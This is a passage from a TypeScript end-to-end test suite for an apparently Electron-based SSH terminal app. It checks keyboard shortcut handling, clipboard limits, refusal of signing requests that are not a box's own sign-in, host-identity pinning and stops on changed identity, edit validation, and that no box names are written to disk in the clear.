      check('a tab under a dialog cannot either; and more than the limit at once is refused whole', inUse && underDialog === 'untouched' && tooMuch === 'untouched' && ctx.dropped() === droppedBeforeCopy + 1, [underDialog.slice(0, 40), tooMuch.length, ctx.dropped() - droppedBeforeCopy, inUse]);
      ctx.win.focus();
      const stillInUse = await until(() => ctx.win.isFocused(), 4000);
      await js(frontTab.view, `window.tabPort.copy('one\\ntwo')`);
      await sleep(250);
      check('the tab in front of the window in use can: the text is on the clipboard, and the window says what was copied', stillInUse && (await clipboard.readText()) === 'one\ntwo' && (await text('#status')).includes('Copied 2 lines'), [await clipboard.readText(), await text('#status'), stillInUse]);
      // The window's own keys. Which tab is in front is the window's business, not a box's, so main answers
      // these presses before any view is given them: they work the same wherever the focus is, and a box is
      // never sent them.
      const press = (w: Electron.WebContents, keyCode: string, modifiers: ('control' | 'shift' | 'alt')[]): void => {
        w.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
        w.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
      };
      // A window key is refused outright when the window is not the one in use, and that refusal is right.
      // So the window is put in use and that is waited for before any of these presses: without it a probe
      // about which tab is in front would quietly become a probe about how the machine hands out focus, and
      // would fail saying the key did nothing when what really happened is that it was never ours to act on.
      ctx.win.focus();
      const inUseForKeys = await until(() => ctx.win.isFocused() && !ctx.overlayOn(), 4000);
      // Both of the reasons main refuses a window key are said in each detail below, so a failure here names
      // which of them it was rather than leaving it to be guessed at.
      const keysCouldWork = (): unknown[] => [`in use: ${ctx.windowInUse()}`, `a dialog over it: ${ctx.overlayOn()}`];
      const ids = [...ctx.tabs.keys()];
      const nextAlong = ids[(ids.indexOf(t.id) + 1) % ids.length]!;
      await boxGot();
      const keysRefusedBefore = ctx.keysRefused();
      // The page is asked to write down any key it is given, so the rule being proved is the real one: main
      // answers these presses and no view is ever given them, rather than the view simply making nothing of it.
      await js(t.view, `(window.__keysSeen = [], document.addEventListener('keydown', (e) => window.__keysSeen.push(e.key), true))`);
      press(t.view.webContents, 'Tab', ['control']);
      const moved = await until(() => ctx.shellState().active === nextAlong, 2000);
      const keyToBox = await boxGot();
      const pageSaw = await js<string[]>(t.view, `window.__keysSeen`);
      check('Ctrl+Tab, pressed in the terminal, moves to the next tab, and neither the page nor the box is given it', inUseForKeys && moved && ids.length > 1 && keyToBox === '' && pageSaw.length === 0 && ctx.keysRefused() === keysRefusedBefore, [inUseForKeys, ...keysCouldWork(), ids.length, ctx.shellState().active, nextAlong, JSON.stringify(keyToBox), pageSaw]);
      press(t.view.webContents, 'Tab', ['control', 'shift']);
      check('and Ctrl+Shift+Tab moves back the other way', (await until(() => ctx.shellState().active === t.id, 2000)) && inUseForKeys, [inUseForKeys, ...keysCouldWork(), ctx.shellState().active, t.id]);
      press(t.view.webContents, '1', ['control', 'alt']);
      const toTheFirst = await until(() => ctx.shellState().active === ids[0], 2000);
      press(t.view.webContents, '9', ['control', 'alt']);
      const toTheLast = await until(() => ctx.shellState().active === ids[ids.length - 1], 2000);
      check('Ctrl+Alt and a number reaches that tab, and 9 is the last one however many there are', inUseForKeys && toTheFirst && toTheLast && ids.length > 1, [inUseForKeys, ...keysCouldWork(), toTheFirst, toTheLast, ids.length]);
      // A number past the last tab: nothing moves, and the window says there is no such tab rather than
      // leaving the press unanswered.
      const whereItWas = ctx.shellState().active;
      press(t.view.webContents, '8', ['control', 'alt']);
      await sleep(250);
      check('a number past the last tab moves nothing, and the window says there is no such tab', inUseForKeys && ctx.shellState().active === whereItWas && (await text('#status')).includes('There is no tab 8') && ids.length < 8, [ctx.shellState().active === whereItWas, await text('#status'), ids.length]);
      // A dialog of the window's own is in front: the press is not acted on, it is counted, and no view is
      // given a key that was meant for main.
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      await sleep(100);
      const refusedBeforeDialog = ctx.keysRefused();
      press(t.view.webContents, 'Tab', ['control']);
      await sleep(250);
      const stayed = ctx.shellState().active === whereItWas;
      const counted = ctx.keysRefused() === refusedBeforeDialog + 1;
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      check('under a dialog the press moves nothing and is counted, not passed to a view', stayed && counted && (await boxGot()) === '', [stayed, ctx.keysRefused() - refusedBeforeDialog]);
      // And the same press where the focus is the shell's own: the row of tabs, a menu, the status line.
      ctx.win.focus();
      await until(() => ctx.win.isFocused(), 4000);
      press(ctx.shell.webContents, 'Tab', ['control']);
      const shellPressWorked = await until(() => ctx.shellState().active !== whereItWas, 2000);
      check('the same press works when the focus is on the shell and not on a tab', shellPressWorked, [ctx.shellState().active, whereItWas]);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
      await until(() => ctx.shellState().active === t.id, 2000);
      // A size that is none (no cells, absurdly many, not a number) is refused and never reaches the box.
      const droppedBeforeSize = ctx.dropped();
      const askedBefore = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
      await js(t.view, `(window.tabPort.resize(0, 40), window.tabPort.resize(80, 99999), window.tabPort.resize('wide', 24), window.tabPort.resize(80.5, 24))`);
      await sleep(300);
      refusedByTheLock += 4;
      const askedAfter = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
      check('a terminal size that is none is refused, and the box is told nothing', ctx.dropped() === droppedBeforeSize + 4 && askedAfter === askedBefore, [ctx.dropped() - droppedBeforeSize, askedAfter]);
      await lab.tell('quiet off');

      // The key process signs a sign-in for its own box and user, and nothing else, whoever asks.
      const data = signInData('demo', box().publicKey);
      const good = await ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: data.toString('base64') });
      check('a real sign-in for this box is signed, and the signature is this key\'s', 'signature' in good && verifies(box().publicKey, data, good.signature), good);
      const other = await B.add({ name: 'second-box', colour: 3, host: '127.0.0.1', port, user: 'demo', folder: '', places: [] });
      const id2 = other.ok ? other.id : '';
      const passedBefore = ctx.signsPassedOn();
      const refusals: [string, Promise<SignAnswer>][] = [
        ['another box\'s key named through this box\'s tab', ctx.signAs(id, { key: id2, algorithm: 'ssh-ed25519', data: signInData('demo', B.get(id2)!.publicKey).toString('base64') })],
        ['this key asked for through another box\'s tab', ctx.signAs(id2, { key: id, algorithm: 'ssh-ed25519', data: data.toString('base64') })],
        ['a sign-in as another user', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('root', box().publicKey).toString('base64') })],
        ['a sign-in naming another key', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('demo', B.get(id2)!.publicKey).toString('base64') })],
        ['a session value of another length', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('demo', box().publicKey, randomBytes(20)).toString('base64') })],
        ['bytes that are no sign-in', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: randomBytes(96).toString('base64') })],
        ['a sign-in with a byte more', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: Buffer.concat([data, Buffer.from([0])]).toString('base64') })],
        ['another algorithm', ctx.signAs(id, { key: id, algorithm: 'ssh-rsa', data: data.toString('base64') })],
      ];
      const refused: string[] = [];
      for (const [what, answer] of refusals) if ('signature' in (await answer)) refused.push(what);
      check(`${refusals.length} requests that are not this box's own sign-in are all refused`, refused.length === 0 && ctx.signsRefused() === refusals.length, [refused, ctx.signsRefused()]);
      // Two locks, each seen working: the three that name another key, another box or another algorithm are
      // stopped in main and never reach the key process; the other five are stopped by the key process itself.
      check('three of them never reached the key process; it refused the other five itself', ctx.signsPassedOn() - passedBefore === refusals.length - 3, [ctx.signsPassedOn(), passedBefore]);

      // A second box, checked and pinned, whose key the box does not know: a sign-in failure, nothing more.
      B.reach(id2);
      await until(() => view(id2).step === 'reached', 20_000);
      B.paste(id2, printed);
      await B.trust(id2);
      const t2 = ctx.openTab(id2)!;
      check('a box that does not know our key: sign-in failed, the other tab untouched', (await until(() => t2.engine.link.phase === 'ended', 20_000)) && t2.engine.link.cause === 'sign-in-failed' && t.engine.link.phase === 'up', [t2.engine.link, t.engine.link.phase]);
      ctx.closeTab(t2.id);
      const removed = await B.remove(id2);
      const left = await ctx.keys.request('keys');
      check('removing a box removes its key', removed.ok && !B.get(id2) && Array.isArray(left['keys']) && (left['keys'] as Record<string, unknown>[]).length === 1, [removed, left]);

      // The box at that address becomes another box. The open tab's link ends; a new one is a hard stop.
      const before = t.engine.signAsked;
      const triesBefore = Number((await lab.tell('seen'))['tries']);
      const rekeyed = await lab.tell('rekey');
      const printed2 = String(rekeyed['printed'] ?? '');
      check('the open tab\'s link ended when the box went away, and says how', await until(() => t.engine.link.phase === 'ended' && t.engine.link.cause !== '', 10_000), t.engine.link);
      const t3 = ctx.openTab(id)!;
      const stopped = await until(() => t3.engine.link.phase === 'ended', 20_000);
      const after = await lab.tell('seen');
      check('a box showing another identity is a hard stop: said with what it showed, no key used, no sign-in tried', stopped && t3.engine.link.cause === 'identity-changed' && t3.engine.link.endedIn === 'key-exchange' && t3.engine.link.shownFingerprint !== '' && printed2.includes(t3.engine.link.shownFingerprint) && !printed.includes(t3.engine.link.shownFingerprint) && t3.engine.signAsked === 0 && t.engine.signAsked === before && Number(after['tries']) === 0 && triesBefore >= 1, [t3.engine.link, t3.engine.signAsked, after['tries'], triesBefore]);
      check('and the pin is unchanged', printed.includes(box().pinFingerprint), box().pinFingerprint);
      ctx.closeTab(t3.id);

      // ---- Edit box: what main checks itself, whatever a dialog may or may not have checked first. ----
      const asItWas = { name: box().name, colour: box().colour, host: box().host, port: String(box().port), user: box().user, folder: box().folder, places: box().places.map((p) => ({ name: p.name, folder: p.folder })) };
      const neighbour = await B.add({ name: 'other-box', colour: 4, host: '127.0.0.1', port, user: 'demo', folder: '', places: [] });
      const takenName = await B.edit(id, { ...asItWas, name: 'other-box' });
      check('a name another box already has is refused by main, by field, and nothing is saved', neighbour.ok && !takenName.ok && takenName.error === 'fields' && (takenName.fields ?? {})['name'] === 'another box has this name' && box().name === 'lab-box', [neighbour, takenName, box().name]);
      const sameName = await B.edit(id, { ...asItWas, folder: '/srv/ledger' });
      check('a box keeping its own name is not called taken: it is itself', sameName.ok && box().folder === '/srv/ledger' && box().name === 'lab-box', [sameName, box().folder]);
      const badField = await B.edit(id, { ...asItWas, port: '70000' });
      check('a field that is not right is refused by main, by field', !badField.ok && badField.error === 'fields' && !!(badField.fields ?? {})['port'] && box().port !== 70000, badField);
      // The user: the key is bound to one user on one box, so the key process is told anew.
      const movedUser = await B.edit(id, { ...asItWas, user: 'someone-else' });
      const keysNow = await ctx.keys.request('keys');
      const bound = (keysNow['keys'] as Record<string, unknown>[] | undefined)?.find((k) => k['box'] === id);
      check('changing the box\'s user binds its key to that user, and the key itself is the same', movedUser.ok && box().user === 'someone-else' && bound?.['user'] === 'someone-else' && bound?.['publicKey'] === box().publicKey, [movedUser, bound]);
      await B.edit(id, { ...asItWas, user: 'demo' });
      // The address: an address that changed may be another machine, so the identity pinned for the old one goes.
      const pinWas = box().pinFingerprint;
      const movedAddr = await B.edit(id, { ...asItWas, host: '127.0.0.2' });
      check('changing the address forgets the identity pinned for the old one: the box must be checked again', movedAddr.ok && box().host === '127.0.0.2' && box().pin === '' && box().pinFingerprint === '' && ctx.openTab(id) === null, [movedAddr, box().pin, box().pinFingerprint]);
      // Put it back and pin it again, so the rest of this run has its box.
      await B.edit(id, asItWas);
      B.reach(id);
      await until(() => B.check(id).step === 'reached', 20_000);
      B.paste(id, printed2); // the box was rebuilt a moment ago: these are the lines it prints now
      const pinnedAgain = await B.trust(id);
      check('checked again at its own address, it is pinned again, to the identity it shows now', pinnedAgain.ok && box().pin !== '' && printed2.includes(box().pinFingerprint) && box().pinFingerprint !== pinWas, [pinnedAgain, box().pinFingerprint]);
      // Forget it, on purpose: the identity goes and nothing else does.
      const keyWas = box().publicKey;
      const forgot = await B.forget(id);
      check('forgetting an identity leaves the box and its key exactly as they were', forgot.ok && box().pin === '' && box().publicKey === keyWas && box().name === 'lab-box' && ctx.openTab(id) === null, [forgot, box().publicKey === keyWas]);
      const forgotAgain = await B.forget(id);
      check('forgetting one that is already forgotten changes nothing and is not an error', forgotAgain.ok && box().pin === '', forgotAgain);
      // A box that is not there cannot be edited, forgotten or deleted.
      const noBox = await Promise.all([B.edit('bno-such-box', asItWas), B.forget('bno-such-box'), B.remove('bno-such-box')]);
      check('a box that is not there cannot be edited, forgotten or deleted', noBox.every((r) => !r.ok && r.error === 'no such box'), noBox);
      await B.remove(neighbour.ok ? neighbour.id : '');
      // Pinned once more, so what this run leaves on disk is a box as it should be: the next start reads it.
      B.reach(id);
      await until(() => B.check(id).step === 'reached', 20_000);
      B.paste(id, printed2);
      const pinnedLast = await B.trust(id);
      check('and after all of that the box is left as a box should be: named, keyed and pinned', pinnedLast.ok && box().name === 'lab-box' && box().publicKey !== '' && box().pin !== '', [pinnedLast, box().name, box().pin !== '']);

      ctx.closeTab(t.id);
      lab.end();
      // With the app closed the PC holds one locked file: no box's name is readable in anything the app wrote.
      const named = [...(await filesHolding('lab-box')), ...(await filesHolding('second-box')), ...(await filesHolding('/var/log/it'))];
      check('no file the app wrote names a box or a place in the clear', named.length === 0, named);
    }

    check('no view ever reached the canary web server', canaryHits === 0, canaryHits);
    check(`no message was dropped, but the ones refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
  } catch (err) {
    check('no probe threw', false, err instanceof Error ? (err.stack ?? err.message) : String(err));
  }

  canary.close();
  clearTimeout(guard);
  finish(results.every((r) => r.ok) ? 0 : 1);
}
